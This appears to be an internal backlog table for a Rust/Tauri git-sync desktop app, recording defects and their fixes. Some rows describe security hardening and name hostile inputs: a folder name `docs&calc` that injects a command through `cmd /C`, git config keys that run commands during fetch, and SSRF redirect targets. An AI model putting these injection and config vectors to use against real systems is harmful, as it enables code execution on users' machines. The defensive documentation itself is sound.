| BL-NI-19 (live git re-probe on settings change) | Startup now honors `settings.git_executable_path` (`SystemGitEngine::new(path)`), so a user whose git is off-PATH recovers on RESTART. A LIVE re-probe (no restart) after `settings_set` is deferred: `AppState.git` is a plain `Option<SystemGitEngine>` moved into managed state, so updating it post-launch needs interior mutability (a `Mutex`/`RwLock` or arc-swap around the engine) plus a re-probe on `settings_set`. The core already exposes `SystemGitEngine::reprobe(&mut self) -> GitAvailability` for exactly this. **2026-07-03 RESOLVED (command path):** `AppState.git` is now `RwLock<Option<SystemGitEngine>>` and `settings_set` re-probes and swaps the engine, so the command path (add / check / scan / update) recovers LIVE with no restart. REMAINING (smaller follow-up): the resident scheduler captured its own engine clone at spawn, so the background loop still only picks up a re-probe on restart; making the scheduler loop live needs the engine handle shared into the spawned task. | Codex adversarial review of the edge-wiring / GUI change (2026-07-03); owned by E-03 / the edge-wiring effort. | done (command path); scheduler-loop re-probe is a follow-up |
| BL-NI-20 (scheduler ignores global_check_minutes) | The resident scheduler's `DbOutcomeWriter::record` computes each repo's `next_check_at` from the compile-time `DEFAULT_FREQUENCY_MIN` const (360), not the user's `settings.global_check_minutes`, so the global cadence control in Settings has no effect (per-repo `check_frequency_min` overrides still work). Read the setting in the writer (or at `effective_frequency_min`'s caller) so the global default drives repos with no per-repo override. Note the two distinct knobs: the 1-minute tick PERIOD is fixed and not user-facing; `global_check_minutes` is the default per-repo frequency. **2026-07-03 finding:** `effective_frequency_min(repo_freq, global)` already implements per-repo-override-else-global-else-floor, so the plumbing fix is a one-liner (pass `settings.global_check_minutes` at `scheduler.rs:628` instead of the const). BUT per-repo `check_frequency_min` defaults to 360 (positive), so the per-repo value always wins and the global branch is dead in practice. Making the global cadence actually take effect needs a PRODUCT DECISION: new repos INHERIT the global (store 0 = "inherit") vs SNAPSHOT it (store 360), and whether changing the global retroactively re-cadences existing repos. The one-line plumbing is safe to land now; the visible behavior waits on that decision. **2026-07-03 RESOLVED:** shipped the INHERIT model (commit 16f4a1b) - per-repo `check_frequency_min = 0` inherits the global cadence, a positive value is an explicit override; new repos add with 0, migration 0003 migrates existing rows to 0, and `DbOutcomeWriter::record` now passes `settings.global_check_minutes` to `effective_frequency_min`. The decision (inherit vs snapshot) was made as INHERIT so the Settings global control is effective for every non-overridden repo. | Recon during the edge-wiring effort, confirmed against `scheduler.rs` (2026-07-03); owned by E-08 / the edge-wiring effort. | done (inherit model shipped) |
| BL-NI-21 (regression tests for the edge-wiring / GUI fixes) | The 2026-07-03 Codex adversarial review recommended three regression tests not yet added: (1) manual-vs-scheduled same-repo contention - that a manual `repo_check_now`/`repo_update_now` and a scheduled job serialize on the SHARED `RepoLocks` (a Tauri command-layer integration test needing a `State`/`AppHandle` harness); (2) a quiet-hours UI round-trip (22:00-07:00 to minute-of-day 1320/420 and back), blocked on there being no frontend test runner (no vitest wired); (3) a non-UTC quiet-window gate (a 22:00 LOCAL window gates at local 22:00, not UTC). The underlying mechanisms are already covered (RepoLocks contention by core scheduler tests; local-offset math by the `localtime` tests); these cover the new WIRING. **2026-07-05 RESOLVED (Phase 1 / P1-F):** all three landed as fast-tier tests. (1) `manual_op_and_scheduled_job_on_same_repo_serialize` (`crates/reposync-core/src/scheduler.rs`) obtains the shared per-repo lock via `Scheduler::locks()` the same way `AppState` does and holds it exactly as the manual command path does (`src-tauri/src/commands/mod.rs` `repo_check_now` line 57 / `repo_update_now` line 174), then proves a scheduled `tick_once` on that repo blocks until the manual op releases and runs once with no overlap - a deterministic core test against the current `GitEngineSource`/injected-clock architecture, not a heavyweight Tauri `State`/`AppHandle` harness. (2) `quiet_hours_minute_of_day_survives_round_trip_at_boundaries` (`store.rs`) round-trips the settings quiet-hours window at the 0/1439 boundaries and a wrap-around window and gates the persisted values. (3) `non_utc_quiet_window_gate_uses_local_time_not_utc` + `local_minutes_at_derives_from_injected_offset_only` (`scheduler.rs`) prove the gate decides from the injected UTC offset (PST vs UTC on one instant, midnight-spanning window), never the machine timezone; a small pure `local_minutes_at` helper was extracted from `SystemClock::local_minutes_of_day` to make the offset math testable in isolation. The frontend HH:MM<->minute conversion itself remains untested pending a JS test runner (no vitest wired). Landed in commit `261a689`. **2026-07-31: that last residual is now closed.** PR #32 wired vitest, and `src/lib/time.test.ts` covers `minutesToHhMm`, `hhMmToMinutes`, and an explicit quiet-hours round trip across every minute of the day - the exact conversion this row named as untested. | Codex adversarial review (2026-07-03); owned by the edge-wiring effort / a test-hardening pass. | done |
| BL-NI-22 (repos-in-group filter is O(N) per-repo queries) | The groups frontend (commit 51daaa7) filters the Repos list by the selected group and renders per-row group chips by fanning `groups_for_repo(repo_id)` out across the visible repos (`useRepoGroupMemberships` in `src/hooks/queries.ts`) - one IPC round-trip per repo. Fine for V1 repo counts, but O(N). A single `repos_in_group(group_id) -> Vec<i64>` store fn + IPC command (or folding group ids into `RepoSummary`) makes it O(1). Additive to the IPC surface (new command + bindings regen), no schema change. Also tracked in [E-16 (groups, repo tags) spec](internal/release-plans/plan_v0.9.0/E-16-groups/spec.md) Known-defects section; do not duplicate there. **2026-07-05 RESOLVED (Phase 1 / P1-E):** implemented as a single bulk `repo_group_memberships() -> Vec<RepoGroupMembership { repoId, groupIds }>` (core store fn + unit test, additive IPC command, bindings regen), NOT the literal `repos_in_group(group_id)`. The fan-out powered BOTH the active-group filter AND the per-row group chips, so one bulk membership map (built in a single IPC round-trip) kills the O(N) for both; `repos_in_group` would have served only the filter. The frontend `useRepoGroupMemberships` now issues one call and keeps the same downstream `Map<repoId, groupId[]>` shape and null=loading/error AsyncPanel wiring in `repos.tsx`; the drawer's single-repo `groups_for_repo` usage stays (the right tool for one open repo). Landed in commit `261a689`. | Groups frontend build (2026-07-03); owned by a groups follow-up. | done |
| BL-NI-23 (scheduler loop does not pick up a live git re-probe) | BL-NI-19 made the COMMAND path re-probe git live on settings save, but the resident scheduler captured its own `SystemGitEngine` clone at spawn (a local, not `AppState.git`), so the background loop still only picks up a new git path on restart. Sharing the engine handle (e.g. the same `RwLock`/an arc-swap) into the spawned scheduler task would make the loop live too. **2026-07-04 finding (this entry understated the gap):** if git is absent at startup, no scheduler is spawned at all (`src-tauri/src/lib.rs:250`), so there is no running scheduler task to share the engine handle with in the first place. The "share the engine handle" fix only covers "git path changed while the scheduler was already running"; it cannot cover the primary recovery scenario (install without git on PATH, add it later, fix the path in Settings) unless the scheduler is also spawned once a working engine appears post-startup. This is not low priority: it is the common recovery path, not a rare one. **2026-07-05 RESOLVED (commit `71a0f7b`):** a new core `GitEngineSource` seam (`crates/reposync-core/src/scheduler.rs`) has the scheduler spawned unconditionally at startup; at the top of every cycle it resolves the CURRENT engine through the shared `SharedGitEngine` (`Arc<RwLock<Option<SystemGitEngine>>>`) the same handle `settings_set` swaps on a re-probe. A `None` read skips the whole cycle (no due query, no jobs, no `next_check_at` writes, one deduped log line), and the very next tick after a re-probe swaps an engine in picks up every still-due repo - covering both the stale-clone case this entry originally named and the "git absent at startup, arrives later" case the 2026-07-04 finding said was understated. | BL-NI-19 follow-up (2026-07-03); understated per Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`, finding 6); owned by E-08 / edge-wiring. | done |
| BL-NI-09 (CI build time vs release profile) | The Windows CI bundle took 35m15s, driven by `[profile.release]` (`opt-level="z"` + `lto=true` + `codegen-units=1`, tuned for the <30MB bundle). RESOLVED 2026-06-20 (jp ratified the fast-CI tradeoff): `[profile.release]` switched to `lto="thin"` + `codegen-units=16` for fast per-push CI; full LTO moved to a new `[profile.dist]` (`inherits="release"`, `lto="fat"`, `codegen-units=1`) for release-tag artifacts; CI now builds via the prebuilt `pnpm tauri build` instead of `cargo install tauri-cli`. Verify the actual per-push build time on the next run, and wire the release workflow to select `--profile dist`. | E-01 CI run (35m15s Windows leg). | done |
| BL-NI-24 (opener hardening: path, remote URL, and cmd injection) | Four related opener defects to fix together, all in `src-tauri/src/opener.rs`. **(a) HIGH, path defect:** `repo::add` and `repo_scan_parent` store `local_path` via `std::fs::canonicalize(...)`, which yields Windows extended-length `\\?\C:\...` paths (`opener.rs:47`); `explorer`, `cmd /C`-launched editors, and terminals receive that verbatim path and fail or misbehave, and nothing strips the prefix anywhere in the repo, so open-in works in zero real cases on the primary release platform. **(b) HIGH, remote URL execution:** `repo_open_remote` passes the raw `.git/config` remote URL as the sole argument to `explorer` with no scheme validation (`opener.rs:70`); SSH remotes (`git@github.com:owner/repo.git`, the common form) silently fail, and a crafted remote (a local exe path or a UNC path) is executed on click, a real security defect since any cloned repo controls this string. **(c) MEDIUM, cmd metacharacter injection:** `open_editor`'s `cmd /C` invocation lets a repo folder named e.g. `docs&calc` (no spaces needed) run `calc`, and `%VAR%` expands (`opener.rs:99`). **(d) MEDIUM, silent editor failure:** the same `cmd /C` spawns fine even when the configured editor is misconfigured; the real child-process failure is discarded after detach and the UI toasts "Opened editor" regardless (`opener.rs:20`). Fix together: strip the `\\?\` prefix at the paths seam (or store a non-canonicalized display path), validate/allowlist the remote URL scheme before shelling out, avoid `cmd /C` (or quote/escape it) in favor of a direct process spawn, and propagate the child's actual exit status. **2026-07-05 RESOLVED (commit `187ed2a`):** all four fixed together in `src-tauri/src/opener.rs`. (a) `dunce::canonicalize` at both storage points (`repo::add`, `repo_scan_parent`) so new rows store a clean path; the opener also defensively strips `\\?\` / `\\?\UNC\` via `strip_verbatim_prefix` for legacy rows already in the DB. (b) `repo_open_remote` now validates and translates the remote before opening: http(s) passes through as-is, scp-like and `ssh://` forms translate to https, and everything else (file://, UNC, a local exe path, `javascript:`) is rejected as `AppError::InvalidSetting` rather than executed. (c)+(d) `open_editor` no longer hops through `cmd /C`: the editor resolves via PATH + `PATHEXT` up front (`resolve_executable`, so cmd shims still work) and is spawned directly, so a repo folder named e.g. `docs&calc` is inert and a misconfigured editor surfaces `InvalidSetting` instead of a false "Opened editor" toast. 22 unit tests cover the normalization, the URL table, editor resolution, and (per BL-NI-36 below) wt detection. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), findings 1, 2, 8, 9; phase-1 opener-hardening work item. | done |
| BL-NI-25 (global cadence change does not reschedule existing repos) | Lowering `settings.global_check_minutes` (e.g. 360 to 30) has no effect on already-scheduled repos: `next_check_at` is only recomputed when a job finishes (`crates/reposync-core/src/scheduler.rs:643`), and a restart does not help either. The BL-NI-20 (scheduler inherits global cadence) fix is correct at write time but is not made effective retroactively on settings save. `settings_set` (or a dedicated rescheduling pass) needs to recompute `next_check_at` for every inherit-mode repo when the global cadence changes. **2026-07-05 RESOLVED (commit `71a0f7b`):** `settings_set` now compares the global cadence against its previously-persisted value and, only when it actually changed, calls the new `reschedule_inherit_repos` in one bulk `UPDATE`: `next_check_at = max(now, last_checked_at + new_cadence)` for every inherit-mode repo; per-repo overrides and paused/disabled/never-checked repos are left untouched. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), finding 4. | done |
| BL-NI-26 (settings_set silently swaps a working git engine to None) | A bad `git_executable_path` that also fails PATH fallback replaces the working git engine with `None`, returns `Ok`, and the UI toasts "Settings saved" (`src-tauri/src/commands/mod.rs:361`). The probe failure needs to surface as an error, or the swap needs to be refused and the last-known-working engine kept, instead of silently disabling git for the whole app. **2026-07-05 RESOLVED (commit `71a0f7b`):** the new `git_swap_rejection` decision (`src-tauri/src/commands/mod.rs`) rejects an `Unavailable` probe as `AppError::InvalidSetting { field: "git_executable_path" }` and returns early, so `settings_set` keeps the last-known-working engine and the UI gets a real error instead of a false "Settings saved" toast; an `Available` or `BelowFloor` (still usable) probe is accepted and swapped in live. The whole persist -> reschedule -> re-probe -> swap sequence is also now serialized (see BL-NI-35). | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), finding 5. | done |
| BL-NI-27 (dashboard attention-row taxonomy collapsed to one icon) | Every row in the dashboard's "Needs attention" list renders the failed-red `AlertTriangle` regardless of actual state (`src/screens/dashboard.tsx:100`), violating `DESIGN.md`'s status taxonomy (behind = violet arrow-down, dirty = amber triangle, failed = red x-circle). Wire the row's icon and color to the repo's actual status instead of one hardcoded glyph. **2026-07-05 RESOLVED (commit `4ab54bf`):** each attention row now looks up its repo's live facts, derives its actual status via the shared `deriveStatus`/`STATUS_ICON` map (new `src/lib/status.ts`), and renders that icon/color instead of a hardcoded `AlertTriangle`; a repo that dropped out of the list between fetches falls back to the prior failed-red treatment. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), finding 10. | done |
| BL-NI-28 (repo detail drawer goes stale on background events) | The open repo detail drawer refetches only after its own actions and never subscribes to backend events (`src/components/repo-detail.tsx:73`), unlike the screens behind it. A background scheduled check completing while the drawer is open leaves it showing stale state until the user closes and reopens it. Subscribe the drawer to the same check-completed / state events the list screens use. **2026-07-05 RESOLVED (commit `4ab54bf`):** the repo-detail drawer now subscribes to the per-repo backend events (check/update/state-changed) via `useBackendEvents` and refreshes in place, matching the list screens. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), finding 11. | done |
| BL-NI-29 (a11y batch: focus-invisible controls, missing focus trap, shared accessible names) | Four accessibility gaps to fix together: (a) group rename/delete buttons are focusable but invisible while focused, revealed only on mouse hover via `opacity-0` (`src/components/groups-nav.tsx:188`), so keyboard users land on transparent buttons; (b) `Drawer` and `Dialog` keep `role="dialog" aria-modal="true"` always mounted with no focus trap or Escape handling (`src/components/ui/drawer.tsx:26`), so assistive tech may treat the whole app as inert; (c) the dashboard attention-row focus indicator is effectively invisible; (d) group color swatches share one accessible name, so a screen reader cannot distinguish them. Fix as one pass: visible focus rings independent of hover state, a real focus trap plus Escape-to-close on modal surfaces, and a distinct `aria-label` per swatch. **2026-07-05 RESOLVED (commit `4ab54bf`):** all four fixed as one pass. (a) `group-focus-within/row` reveals the rename/delete buttons alongside the existing hover reveal, plus visible `focus-visible` rings on the row-icon buttons. (b) `Drawer`/`Dialog` are `inert` while closed, gained a hand-rolled focus trap, Escape-to-close, and focus restoration on close (this also fixed hidden dialog form controls being tabbable while closed). (c) attention rows and `RepoRow` get real `focus-visible` rings plus Space-key activation. (d) each group color swatch gets a distinct `aria-label` (`GROUP_COLOR_NAMES`, e.g. "Blue (color 1 of 8)") instead of one shared "Choose group color" label. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), findings 12 and 13, plus the low-severity notes on the attention-row focus indicator and group color swatch names. | done |
| BL-NI-30 (no IPC write path for per-repo cadence) | The per-repo cadence gap is deeper than "no UI": no IPC write path for `check_frequency_min` exists at all. `repo_set_policy` carries only mode and dirty-handling; a command (or an extension to `repo_set_policy`) is needed before the drawer UI can let a user override the inherited cadence for a single repo. **2026-07-05 RESOLVED (Phase 3 / P3-D):** shipped a DEDICATED additive `repo_set_cadence(id, check_frequency_min)` command (chosen over widening `repo_set_policy`, so the frozen `UpdatePolicy` shape is untouched and cadence stays a self-contained concern). Semantics honor the inherit model: `0` = inherit the global cadence, a positive value = explicit per-repo override in minutes, a negative value is rejected (`InvalidSetting`). The write path is `store::repo_set_cadence` (persists `repos.check_frequency_min`); the command then calls the new `scheduler::reschedule_one_repo`, which recomputes that repo's `next_check_at` with the SAME anchored rule commit `71a0f7b` established for the global-change reschedule (factored into a shared `RESCHEDULE_SET_AND_GUARD` const so the single-repo and bulk-inherit paths cannot diverge; effective frequency via `effective_frequency_min`). The repo-detail drawer gained a "Check cadence" control (two always-visible option cards: "Inherit global (every N min)" and a "Custom interval" override input) that shows the effective cadence and wires through the regenerated bindings. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), finding 15. | done |
| BL-NI-31 (declared-but-never-emitted contract events) | `repo:state-changed`, `repo:check-started`, and `error:raised` are declared in the IPC contract but have no emit site anywhere in `src-tauri` (`src-tauri/src/events.rs:40`); the frontend actively subscribes to `repoStateChanged`, which never fires. Either wire the emit sites where the corresponding state actually changes, or remove the dead contract surface and the frontend subscription. **2026-07-05 RESOLVED (P3-C):** all three wired (chose to wire, not remove, since the frontend already subscribes to `repoStateChanged`). `repo:state-changed` fires on the SCHEDULED per-repo completion (via `CollectingOutcomeWriter`, now given the `AppHandle`), which is the only completion path that previously emitted nothing per repo - this unblocks finding 11 (the repo-detail drawer refreshes on a background check). `repo:check-started` fires on the manual check paths (`repo_check_now` + the new tray "Check All Now"). `error:raised` fires on fire-and-forget tray failures (Check All Now / Open recent) that have no synchronous caller; the app-shell now subscribes to it and surfaces an error toast. Payload shapes were already frozen and are unchanged. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), low-severity notes (unverified but evidenced). | done |
| BL-NI-32 (activity retention sweep never attached to the scheduler tick) | The activity retention sweep runs only at startup; the "attach to scheduler tick" precondition landed but the sweep was never actually attached (`src-tauri/src/lib.rs:211`). A resident tray app running for weeks never sweeps old activity rows, so `activity_retention_d` is effectively startup-only. Attach the sweep to the scheduler's periodic tick. **2026-07-05 RESOLVED (Phase 3 / P3-D):** the resident tick loop (`src-tauri/src/lib.rs`) now runs `activity::sweep` gated by the pure `activity::sweep_due` once-per-day guard off the same edge clock the tick uses (`localtime::now_unix`). The gate is seeded to "just swept" at loop start (the startup sweep already ran, so the first tick-driven sweep is ~24h later), the sweep runs AFTER the tick's jobs have joined so it never blocks the check cycle (one short DELETE), and the gate advances on every attempt (success or failure) so a transient failure waits for the next day rather than retrying every minute. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), low-severity notes. | done |
| BL-NI-33 (E-02 database-recovery notice cannot reach the UI) | `db_recovered` and `db_backup_path` are parked in `AppState` after a migration-failure recovery, but no command reads them (`src-tauri/src/lib.rs:70`), so the AC7 database-recovery notice specified in [E-02 (persistence and paths) spec](internal/release-plans/plan_v0.9.0/E-02-persistence/spec.md) can never reach the UI. Add a command (or fold the fields into an existing startup-state query) so the frontend can surface the notice. **2026-07-05 RESOLVED (Phase 3 / P3-D):** added an additive `db_recovery_notice()` command returning the new `DbRecoveryNotice { recovered, backup_path }` IPC type (its `backup_path` is rendered to a display string at the edge via a pure, unit-tested `build_recovery_notice` helper). The frontend reads it once at launch (`useDbRecoveryNotice`) and the app shell surfaces a dismissible banner naming where the previous database was preserved, so the E-02 AC7 notice now reaches the UI. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), low-severity notes. | done |
| BL-NI-34 (migration 0001 default of 360 contradicts the inherit model) | Migration 0001's schema default for `check_frequency_min` is `360` (a positive override value), which now contradicts the BL-NI-20 (scheduler inherits global cadence) inherit model, where `0` means "inherit the global cadence" and migration 0003 migrates existing rows to `0`. Any future INSERT that relies on the column default (bypassing the application's explicit `0`) silently creates a 6-hour override instead of inheriting. Change the schema default to `0` in a follow-up migration, or ensure every insert path sets it explicitly and document why the schema default is intentionally different. **2026-07-05 RESOLVED (commit `71a0f7b`):** `crates/reposync-core/migrations/0004_default_cadence_inherit.sql` flips the `repos.check_frequency_min` schema default from `360` to `0` via the documented FK-safe table-rebuild pattern (`PRAGMA foreign_keys = OFF` + an explicit `BEGIN`/`COMMIT`, since disabling foreign keys is only legal outside sqlx's own transaction wrapping); every existing row is copied forward verbatim, so no data is lost or renumbered. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), low-severity notes. | done |
| BL-NI-35 (settings_set persist/probe/swap is not serialized) | `settings_set`'s persist, git-probe, and engine-swap sequence is not serialized, so overlapping saves (rapid double-submits, or two windows saving at once) race on which probe result wins the final engine swap. Wrap the sequence in a mutex or a single-flight guard keyed on the settings write. **2026-07-05 RESOLVED (commit `71a0f7b`):** `settings_set` now holds a `settings_write_lock` (a single-flight async mutex) across the whole persist -> reschedule -> re-read -> probe -> swap sequence, so two overlapping saves can no longer interleave and leave the live engine reflecting older settings than the database. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), low-severity notes. | done |
| BL-NI-36 (`wt` detection misses full paths to wt.exe) | Windows Terminal (`wt`) detection only matches a bare `wt` on PATH and misses a full path to `wt.exe` (e.g. a per-user install not on PATH), so `repo_open_terminal` falls back to the default terminal even when Windows Terminal is actually installed and reachable by full path. Extend the detection to check a full-path candidate, not just PATH resolution. **2026-07-05 RESOLVED (commit `187ed2a`):** Windows Terminal is now detected by the executable's file STEM (`is_windows_terminal`), so a bare `wt`, `wt.exe`, or a full path like `C:\Users\me\...\wt.exe` all match, and a full-path install gets `-d <path>` the same as a PATH-resolved one. | Fable audit 2026-07-04 (`_LOCAL/audit/2026-07-04_18-21_fable-audit.md`), low-severity notes. | done |
| BL-NI-37 (pin the Rust toolchain: floating stable + -D warnings) | CI installs a floating `@stable` Rust toolchain while gating with `-D warnings`, so a new stable release with new lints can turn the tree red with zero code changes. Add `rust-toolchain.toml` pinning the workspace toolchain (and have CI honor it), bumping deliberately. | ci-plan.md Section 2.4; deferred from the 2026-07-04 P0-B CI rework. | done 2026-07-30. `rust-toolchain.toml` now pins an exact version (`1.96.0`) rather than the floating `stable` channel, and it is the single source of truth: every workflow job reads the channel out of the file and passes it to `dtolnay/rust-toolchain@master`, because that action does not read `rust-toolchain.toml` itself (it derives from its `@rev` or an explicit `toolchain` input). Bumping Rust is now a one-line change in one file, and a new stable release can no longer redden an unrelated PR through `-D warnings`. |
| BL-NI-38 (verify the frontend-dist-at-compile-time assumption in CI) | The reworked ci.yml builds the frontend before every cargo step because `generate_context!` needs `../dist` at shell-crate compile time. Confirm on the first green run that no cargo step still compiles without `dist` present (and that clippy `--all-targets` is covered), then remove this entry or fix the ordering. **DONE 2026-08-07, verified rather than changed.** The ordering was checked directly and is correct: `ci.yml`'s `build` job runs `pnpm install` then `Build frontend` BEFORE `cargo fmt`, `cargo clippy --all-targets`, `cargo test --workspace`, the bindings-export check, and `pnpm tauri build` - every step that could link the `reposync` crate and therefore needs `../dist` to exist for `generate_context!`. The `slow-tests` job scopes to `-p reposync-core` and never compiles `src-tauri`, so it has no dist dependency at all. That ordering has held since commit 50b6717 (2026-07-04) with every merge since running green under it. No extra guard was added on purpose: a missing or removed `dist` makes `generate_context!` fail loudly at compile time, so a regression here is self-evident on the very next pull request rather than silent, and a second mechanism to detect a self-announcing failure is cost without benefit. | ci-plan.md Sections 1.4 and 2.2; flagged by the 2026-07-04 P0-B CI rework. | done 2026-08-07 |
| BL-NI-48 (git run_git chokepoint hardening) | RepoSync runs `git` autonomously on the scheduler tick inside repo directories the user assembled from arbitrary origins, so the target repo's `.git/config` is attacker-controlled and several config keys EXECUTE a command during a plain fetch/pull with no user action (`core.fsmonitor`, `core.hooksPath` hooks, the `ext::<cmd>` remote-helper protocol) - user-privileged code on a timer (security review R1, HIGH). Separately `run_git` had no wall-clock bound, so one dead/hostile remote could hang the whole resident scheduler (R2 / correctness CC-1). **2026-07-11 RESOLVED (this session):** `crates/reposync-core/src/git/cli.rs` now builds every invocation through a hardened `build_git_command` - `-c core.fsmonitor=`, `-c core.hooksPath=/dev/null`, `-c protocol.ext.allow=never` (a `-c` override has highest config precedence, so it neutralizes the repo-local value), plus `GIT_TERMINAL_PROMPT=0` / empty `GIT_ASKPASS` / `SSH_ASKPASS` / `GCM_INTERACTIVE=never` so a background op fails fast (paused-on-auth) instead of popping a GUI dialog or hanging. `run_git` now wraps `output()` in a 120s `tokio::time::timeout` with `kill_on_drop(true)`; on elapse it returns a synthetic capture that classifies as a NetworkFailure (retry, then 3-strikes pause), so no error-taxonomy change. Two argv/env unit tests pin the hardening. **RESIDUAL (open):** two repo-local vectors that only fire for an auth-demanding or ssh remote - `credential.helper=!cmd` and `core.sshCommand` - are deliberately NOT closed, because overriding them without breaking a user's legitimate private-repo credentials or ssh config needs a product decision (scope to https/public remotes, or a per-repo trust prompt). | Security review R1/R2 + correctness CC-1 (`_local/audit/2026-07-10_fable-audit/06_THREAT-MODEL.md`, `05_CORE-CORRECTNESS-REVIEW.md`). | done (residual: credential.helper/sshCommand open) |
| BL-NI-49 (GitHub HTTP client timeout + redirect policy) | The `reqwest` client in `github.rs` was built with no `.timeout()` (reqwest has none by default) and the default redirect policy (follows up to 10). A half-open socket would block the refresh task for the OS TCP timeout while holding the shared rate-budget lock (correctness CC-1), and a MITM redirect off the constant `api.github.com` host toward an internal target (169.254.169.254, a localhost port) was an SSRF primitive (security R3). **2026-07-11 RESOLVED (this session):** `ReqwestTransport::new` now sets `.timeout(30s)`, `.connect_timeout(10s)`, and `.redirect(reqwest::redirect::Policy::none())`; a refused redirect returns a 3xx that fails the existing `is_success()` check and degrades to `NetworkLost`. **RESIDUAL (open):** no response body-size cap - a MITM with a valid cert could stream a large body within the 30s window (task-bounded, high attacker bar). A streamed byte-budget on `resp.json()` closes it. | Security review R3 + correctness CC-1 (`_local/audit/2026-07-10_fable-audit/`). | done (residual: body-size cap open) |
| BL-NI-50 (DB recovery resets on ANY open/migrate error, not just corruption) | `init_pool_with_recovery` (`crates/reposync-core/src/db.rs:97-157`) moves the database aside and starts fresh on ANY error from `open_pool` OR `run_migrations` - a deliberate uniform-treatment choice (comment at db.rs:90-91). The gap: it conflates "migration failed because the database is bad" (reset is right) with "migration failed because the MIGRATION is bad" (reset is catastrophic). A transient `SQLITE_BUSY` lock at startup, a checksum mismatch, or - the real danger - one buggy migration in a future release would silently reset every user's database to empty on first launch after the update. Data is preserved on disk (renamed, never deleted), so this is Medium, but the blast radius is fleet-wide for an app whose value is a curated repo library. Narrow the trigger: reset only on genuine corruption (`SQLITE_CORRUPT`/`SQLITE_NOTADB`), retry transient locks with backoff, fail LOUD (do not reset) on a version/checksum mismatch; pair with a real migration test in CI before any schema change ships. Gates a safe public flip. **2026-07-11 RESOLVED:** `init_pool_with_recovery` (`db.rs`) now classifies the open/migrate failure (`classify_init_failure`) and resets ONLY on a genuine corruption signature (`file is not a database` / `disk image is malformed`). A transient lock (`SQLITE_BUSY`/`LOCKED`) is retried twice with a 500ms backoff and then fails loud (never resets a healthy-but-locked DB); a version/checksum mismatch, a buggy migration, or an I/O error fails LOUD and leaves the DB untouched (the default branch is Fatal, so a database is reset only on an explicit corruption signature). Startup returns an error in the fatal case instead of silently wiping data, so a buggy future migration is caught, not fleet-reset. Tests: a `classify_init_failure` unit test across all three buckets, a fail-loud integration test (a directory at the db path yields `Err` with no reset), and the existing corrupt-recovers + clean-start regressions all pass; clippy `-D warnings` clean. FOLLOW-UPS (open): add a CI migration test before any schema change (the dangerous trigger is a future release's own migration), and the shell could turn the fatal-startup `.expect` panic (`src-tauri/src/lib.rs:267`) into a graceful error dialog. | Correctness review DS-1 (`_local/audit/2026-07-10_fable-audit/05_CORE-CORRECTNESS-REVIEW.md`). | done (2 follow-ups open) |
| BL-NI-51 (locked-file fallback DB is never adopted as canonical) | When the recovery move-aside rename fails because the original DB is locked (`db.rs:141-155`), the code opens a fresh DB at a UNIQUE SIBLING path `reposync-fresh-<stamp>.db`, but `AppPaths::db_path()` always returns the canonical `reposync.db`, so the next launch never reopens that sibling (each locked launch mints another throwaway; the session's work is stranded). The recovery notice is also wrong here - `backup_path` is `None`, so it logs "preserved at None" while the real data still sits at the original path. Either adopt the fresh sibling durably (persist a pointer) or fail loudly telling the user the DB is locked, and correct the notice. **2026-08-07: ATTEMPTED, reviewed, and deliberately NOT merged (PR #53, closed). The row is more useful now than it was, and the attempt is why.** The naming-only fix (deterministic `reposync-fallback.db` instead of a timestamp, so a relaunch reopens the same file) works day to day and is the WRONG trade for a database. Compare the failure modes honestly. Today, every launch mints an empty database, so the user sees an empty library immediately and every time: obviously broken, noticed in seconds, nothing accumulates that they would miss. With a persistent fallback, they work normally for days, then whatever held the canonical file releases it, the next launch moves the canonical aside SUCCESSFULLY, selects a brand new canonical database, and silently strands everything written since. Less frequent, far more costly. The banner the attempt added made it worse by telling the user to close the holder and restart, which is exactly the action that triggers the loss. **What the fix actually needs is a durable active-database SELECTION plus an explicit reconciliation step, not a naming change.** Two candidate designs, both recorded so the next attempt starts here: (a) a pointer file outside either database naming the active one, with promotion of the fallback to canonical as an explicit atomic step; (b) let the fallback's EXISTENCE be the selection - "if a fallback exists it is the database, until a human reconciles" - which needs no pointer, is self-consistent (a stale fallback cannot be resurrected, because it would never have been abandoned), and whose reconciliation is the user deleting the file. (b) is smaller and probably right. **NOT unattended-safe either way, same class as BL-NI-53 and BL-NI-73:** it changes which database the app opens at startup, a mistake opens the wrong file, and no gate in this repo can see it. **Tests it must have:** at least two simulated launches, covering continued lock failure, a subsequent move SUCCESS (the data-loss case), canonical repair or deletion, and a pre-existing fallback from an earlier recovery. The attempt's tests only exercised the pure path helper and could not have caught any of these. | Correctness review DS-2 (`_local/audit/2026-07-10_fable-audit/05_CORE-CORRECTNESS-REVIEW.md`). | open (attempted 2026-08-07 and rejected on review; needs durable selection + reconciliation, NOT unattended-safe) |
